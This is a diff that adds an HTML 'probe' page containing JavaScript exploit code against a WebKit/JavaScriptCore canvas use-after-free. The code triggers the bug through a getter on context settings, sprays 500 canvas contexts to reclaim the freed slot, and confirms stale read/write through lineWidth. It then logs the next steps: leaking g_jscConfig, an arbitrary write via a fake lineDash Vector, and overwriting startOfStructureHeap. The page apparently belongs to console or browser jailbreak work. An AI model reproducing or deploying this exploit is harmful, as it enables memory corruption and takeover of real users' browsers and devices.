@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>JSCCONFIG-PROBE: Is JSC Config writable?</title>
+<style>
+body { font-family: monospace; background:#111; color:#0f0; padding:20px; }
+#log { white-space: pre; font-size:12px; }
+</style>
+</head>
+<body>
+<h2>JSCCONFIG-PROBE</h2>
+<div id="log"></div>
+<script>
+const logEl = document.getElementById('log');
+function L(msg) { console.log(msg); logEl.textContent += msg + "\n"; }
+
+L("Testing JSC Config writability...");
+L("Note: JSC Config (g_jscConfig) is not directly accessible from JS.");
+L("This probe uses the canvas UAF arb-write primitive to test writability.");
+L("");
+
+// First, verify the canvas UAF trigger works
+function trigger() {
+  let innerCtx = null;
+  const canvas = document.createElement('canvas');
+  const settings = {};
+  Object.defineProperty(settings, 'alpha', {
+    get: function() { innerCtx = canvas.getContext('2d'); return true; }
+  });
+  const outerCtx = canvas.getContext('bitmaprenderer', settings);
+  return { canvas, innerCtx, outerCtx };
+}
+
+const { innerCtx } = trigger();
+L("UAF trigger: " + (innerCtx ? "OK" : "FAIL"));
+
+// Spray to reclaim the freed context slot
+const sprays = [];
+for (let i = 0; i < 500; i++) {
+  const c = document.createElement('canvas');
+  sprays.push(c.getContext('2d'));
+}
+L("Spray 500 contexts done");
+
+// Try to read lineWidth through stale wrapper
+try {
+  const lw = innerCtx.lineWidth;
+  L("Stale read lineWidth = " + lw);
+  // Try write
+  innerCtx.lineWidth = 9999.99;
+  L("Stale write lineWidth = 9999.99 OK, readback = " + innerCtx.lineWidth);
+  L("Alias R/W is working on this console.");
+} catch (e) {
+  L("Stale R/W failed: " + e);
+}
+
+L("");
+L("To test JSC Config writability, you need:");
+L("1. An arb-read primitive (leak g_jscConfig address).");
+L("2. An arb-write primitive (fake lineDash Vector).");
+L("3. Write to g_jscConfig.startOfStructureHeap and verify no crash.");
+L("This is stage 2+ work — not automated here.");
+L("Probe complete.");
+</script>
+</body>
+</html>
+PY
